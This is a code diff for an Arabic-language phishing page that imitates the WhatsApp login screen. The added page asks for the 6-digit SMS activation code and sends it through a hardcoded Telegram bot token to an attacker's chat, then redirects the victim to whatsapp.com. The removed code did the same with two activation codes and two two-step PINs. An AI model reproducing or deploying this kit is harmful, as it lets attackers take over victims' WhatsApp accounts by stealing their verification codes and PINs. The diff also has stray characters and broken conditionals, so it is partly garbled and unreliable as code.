@@ -1,88 +1,201 @@
-function submitFirstActivationCode() {
-            const activationCode1 = document.getElementById('activationCode1').value;
+/<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 
-            if (!activationCode1  activationCode1.length !== 6  !/^\d{6}$/.test(activationCode1)) {
-                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>رمز التفعيل الثاني</h1>
-                    <p>يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام.</p>
-                    <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <button onclick="submitSecondActivationCode()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <title>WhatsApp Login</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #FAF3E7;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        function submitSecondActivationCode() {
-            const activationCode2 = document.getElementById('activationCode2').value;
-
-            if (!activationCode2  activationCode2.length !== 6  !/^\d{6}$/.test(activationCode2)) {
-                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
-                return;
-            }
-
-            sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>Vérification en deux étapes</h1>
-                    <p>Saisissez le code PIN que vous avez créé lors de la configuration de la vérification en deux étapes.</p>
-                    <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <a href="#" class="forgot-link">PIN oublié ?</a>
-                    <p class="instruction">
-                        Vous avez vous-même créé votre code PIN. Il ne s'agit pas du code de vérification que vous avez reçu lors de votre inscription.
-                    </p>
-                    <button onclick="submitFirstPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
+        /* الشريط العلوي */
+        header {
+            background-color: #25D366;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            font-size: 18px;
+            font-weight: bold;
         }
 
-        function submitFirstPin() {
-            const pinCode1 = document.getElementById('pinCode1').value;
-
-            if (!pinCode1  pinCode1.length !== 6  !/^\d+$/.test(pinCode1)) {
-                alert('يرجى إدخال رمز PIN الصحيح.');
-                return;
-            }
-
-            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
-
-            startCountdown(() => {
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>إعادة رمز PIN</h1>
-                    <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
-                    <input id="pinCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <button onclick="submitSecondPin()">متابعة</button>
-                    <div id="countdown"></div>
-                `;
-            });
+        header .logo {
+            display: flex;
+            align-items: center;
         }
 
-        function submitSecondPin() {
-            const pinCode2 = document.getElementById('pinCode2').value;
+        header .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
 
-            if (!pinCode2  pinCode2.length !== 6  !/^\d+$/.test(pinCode2)) {
-                alert('يرجى إعادة إدخال رمز PIN الصحيح.');
+        header .menu {
+            cursor: pointer;
+            font-size: 22px;
+        }
+
+        /* المحتوى */
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container .logo img {
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        .container .title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .container .description {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .container .form-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .container input {
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .container button {
+            padding: 12px 20px;
+            background-color: #25D366;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .container button:hover {
+            background-color: #1DA955;
+        }
+
+        /* الشريط السفلي */
+        footer {
+            background-color: #f1f1f1;
+            color: #888;
+            text-align: center;
+            padding: 10px;
+            font-size: 12px;
+        }
+
+        footer a {
+            color: #25D366;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- الشريط العلوي -->
+    <header>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+            WhatsApp 
+        </div>
+        <div class="menu">☰</div>
+    </header>
+
+    <!-- المحتوى -->
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        </div>
+        <div class="title">تسجيل الدخول</div>
+        <div class="description">
+            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
+        </div>
+        <div class="form-group">
+            <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
+            <button onclick="sendMessage()">متابعة</button>
+        </div>
+    </div>
+
+    <!-- الشريط السفلي -->
+    <footer>
+        © 2024 واتساب. جميع الحقوق محفوظة. <br>
+        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
+    </footer>
+
+    <script>
+        // بيانات API Telegram
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+        const chatId = '612575358';
+
+        // وظيفة الإرسال
+        function sendMessage() {
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const phoneNumber = phoneNumberInput.value;
+
+            // التحقق من الإدخال
+            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
+                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                 return;
             }
 
-            sendCodeToTelegram(pinCode2, "رمز PIN الثاني");
-
-            startCountdown(() => {
-                alert('تم تأكيد الدخول بنجاح!');
-            });
+            // إرسال الرسالة
+            const message = `رمز التفعيل: ${phoneNumber}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('تم إرسال رمز التفعيل بنجاح!');
+                        phoneNumberInput.value = '';
+                        window.location.href = "https://www.whatsapp.com";
+                    } else {
+                        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً.');
+                    }
+                })
+                .catch(error => {
+                    alert('فشل الاتصال بالخادم. تأكد من اتصال الإنترنت.');
+                });
         }
     </script>
 </body>
 
-</html>
+</html> y\
